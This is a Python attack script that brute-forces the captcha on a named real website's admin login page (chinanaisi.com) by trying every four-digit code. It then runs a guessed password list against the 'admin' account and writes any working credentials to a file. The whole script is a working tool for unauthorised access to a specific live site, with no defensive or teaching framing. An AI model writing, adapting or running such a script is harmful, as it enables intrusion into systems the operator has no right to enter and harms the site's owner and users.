#!/usr/bin/env python3
"""chinanaisi.com captcha brute + password attack"""
import subprocess, json, time

r = subprocess.run(
    ['curl','-sk','--connect-timeout','8',
     'https://api.myxypt.com/captcha?width=140&height=48',
     '-c','/tmp/cn_jar.txt','-b','/tmp/cn_jar.txt'],
    capture_output=True, text=True, timeout=12)

d = json.loads(r.stdout)
uid = d['data']['uuid']
print(f'UUID={uid}', flush=True)

PWDS = ['admin','123456','admin888','admin123','admin2024','chinanaisi',
        'naisi888','naisi123','password','888888','000000','naisi',
        'chinanaisi888','admin88888','12345678','naisi2024']

for i in range(10000):
    cv = f'{i:04d}'
    try:
        r2 = subprocess.run(
            ['curl','-sk','--connect-timeout','3','--max-time','5','-L',
             'http://chinanaisi.com/admin/login.php','-X','POST',
             '-d', f'action=loginpost&uuid={uid}&loginId=&username=admin&password=admin&checkcode={cv}',
             '-b','/tmp/cn_jar.txt'],
            capture_output=True, text=True, timeout=7)
        
        body = r2.stdout
        # Check if response differs from captcha-error / login-page
        is_captcha_err = ('\u9a8c\u8bc1\u7801\u4e0d\u6b63\u786e' in body or  # 验证码不正确
                          '\u9a8c\u8bc1\u7801\u9519\u8bef' in body)  # 验证码错误
        is_login_page = '\u540e\u53f0\u767b\u5f55' in body  # 后台登录
        
        if not is_captcha_err and not is_login_page and len(body) > 50:
            print(f'>>> CAPTCHA OK: {cv}', flush=True)
            # Try passwords
            for pw in PWDS:
                r3 = subprocess.run(
                    ['curl','-sk','--connect-timeout','4','-L',
                     'http://chinanaisi.com/admin/login.php','-X','POST',
                     '-d', f'action=loginpost&uuid={uid}&loginId=&username=admin&password={pw}&checkcode={cv}',
                     '-b','/tmp/cn_jar.txt'],
                    capture_output=True, text=True, timeout=8)
                b3 = r3.stdout
                if '\u540e\u53f0\u767b\u5f55' not in b3:
                    print(f'>>> PW: {pw} RESP: {b3[:80]}', flush=True)
                    with open('/tmp/CN_HIT.txt','w') as f:
                        f.write(f'user=admin\npass={pw}\ncode={cv}\nuid={uid}\n\n{b3[:2000]}')
                    break
            break
    except Exception as e:
        pass
    
    if i % 500 == 0 and i > 0:
        print(f'[{i}/10000]', flush=True)

print('DONE')
